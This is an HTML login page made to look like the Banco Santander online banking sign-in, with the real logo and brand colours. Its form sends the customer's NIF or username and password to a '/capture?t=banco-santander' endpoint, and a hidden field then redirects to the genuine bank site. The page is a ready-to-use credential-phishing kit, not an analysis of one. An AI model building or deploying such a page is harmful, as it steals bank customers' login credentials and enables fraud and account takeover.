  <!DOCTYPE html>
  <html lang="es">
  <head>
    <meta charset="UTF-8">
    <title>Acceso Clientes | Banco Santander</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
      body{margin:0;background:#f5f5f5;font-family:'Santander Text',Arial,sans-serif;color:#333;height:100vh;display:flex;align-items:center;justify-content:center}
      .container{max-width:420px;width:90%;background:#fff;padding:40px;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,0.1);text-align:center}
      .logo{width:180px;margin-bottom:30px}
      h1{font-size:24px;color:#ec0000;font-weight:600;margin-bottom:20px}
      input{width:100%;padding:14px;margin:10px 0;border:1px solid #ccc;border-radius:8px;font-size:16px}
      input:focus{border-color:#ec0000;outline:none}
      button{background:#ec0000;color:#fff;padding:14px;border:none;border-radius:8px;width:100%;font-size:17px;font-weight:600;cursor:pointer}
      button:hover{background:#c00}
      .footer{font-size:12px;color:#666;margin-top:30px}
    </style>
  </head>
  <body>
    <div class="container">
      <img src="https://www.santander.com/content/dam/santander-com/es/stories/images/logo-santander.svg" alt="Santander" class="logo">
      <h1>Banca Online</h1>
      <form action="/capture?t=banco-santander" method="POST">
        <input type="text" name="user" placeholder="NIF / Usuario" required autocomplete="username">
        <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
        <button type="submit">Acceder</button>
        <input type="hidden" name="redirect" value="https://www.bancosantander.es/particulares">
      </form>
      <div class="footer">Banco Santander S.A. © 2025</div>
    </div>
  </body>
  </html>
